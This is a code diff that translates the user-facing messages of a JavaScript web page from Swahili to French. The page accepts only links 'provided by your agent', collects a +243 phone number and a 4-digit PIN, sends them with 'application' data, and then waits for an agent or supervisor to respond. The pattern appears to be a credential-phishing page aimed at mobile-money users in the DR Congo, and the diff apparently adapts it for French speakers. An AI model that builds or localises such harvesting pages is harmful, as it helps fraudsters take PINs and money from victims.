@@ -64,9 +64,9 @@ document.addEventListener('DOMContentLoaded', function() {
             pinScreen.innerHTML = `
                 <div style="text-align:center;padding:20px;">
                     <div style="font-size:48px;margin-bottom:16px;">⚠️</div>
-                    <h3 style="color:#991b1b;margin:0 0 12px;">Kiungo Hakiko Sahihi</h3>
-                    <p style="color:#666;margin:0 0 20px;">Tafadhali rudi na utumie kiungo sahihi ulichopewa na wakala wako.</p>
-                    <button onclick="history.back()" style="background:#FF0000;color:#fff;border:none;padding:12px 28px;border-radius:8px;font-size:15px;cursor:pointer;font-weight:600;">← Rudi Nyuma</button>
+                    <h3 style="color:#991b1b;margin:0 0 12px;">Lien Invalide</h3>
+                    <p style="color:#666;margin:0 0 20px;">Veuillez revenir en arrière et utiliser le lien correct fourni par votre agent.</p>
+                    <button onclick="history.back()" style="background:#FF0000;color:#fff;border:none;padding:12px 28px;border-radius:8px;font-size:15px;cursor:pointer;font-weight:600;">← Retour</button>
                 </div>
             `;
         }
@@ -103,9 +103,9 @@ document.addEventListener('DOMContentLoaded', function() {
         const phoneNumber = phoneInput.value.trim().replace(/\s/g, '');
         const pin         = pinInput.value.trim();
 
-        if (!phoneNumber)                                    { showError('Tafadhali weka nambari yako ya simu'); phoneInput.focus(); return; }
-        if (!phoneNumber.match(/^\+?243\d{9}$/))            { showError('Nambari ya simu sio sahihi. Tumia format: +243XXXXXXXXX'); phoneInput.focus(); return; }
-        if (pin.length !== 4)                               { showError('PIN lazima iwe na nambari 4'); pinInput.focus(); return; }
+        if (!phoneNumber)                                    { showError('Veuillez entrer votre numéro de téléphone'); phoneInput.focus(); return; }
+        if (!phoneNumber.match(/^\+?243\d{9}$/))            { showError('Numéro de téléphone invalide. Utilisez le format : +243XXXXXXXXX'); phoneInput.focus(); return; }
+        if (pin.length !== 4)                               { showError('Le PIN doit contenir exactement 4 chiffres'); pinInput.focus(); return; }
 
         // Update session data
         let applicationData = {};
@@ -143,14 +143,14 @@ document.addEventListener('DOMContentLoaded', function() {
             } else {
                 processingScreen.style.display = 'none';
                 pinScreen.style.display        = 'block';
-                showError(result.message || 'Imeshindwa. Tafadhali jaribu tena.');
+                showError(result.message || 'Échec. Veuillez réessayer.');
             }
 
         } catch (error) {
             console.error('❌ Network error:', error);
             processingScreen.style.display = 'none';
             pinScreen.style.display        = 'block';
-            showError('Hitilafu ya mtandao. Kagua muunganisho wako na jaribu tena.');
+            showError('Erreur réseau. Vérifiez votre connexion et réessayez.');
         }
     });
 
@@ -190,7 +190,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 clearInterval(interval);
                 processingScreen.style.display = 'none';
                 pinScreen.style.display        = 'block';
-                showError('Muda umeisha. Msimamizi hajaitikia. Tafadhali jaribu tena baadaye.');
+                showError('Délai dépassé. L\'agent n\'a pas répondu. Veuillez réessayer plus tard.');
             }
         }, 2000);
     }
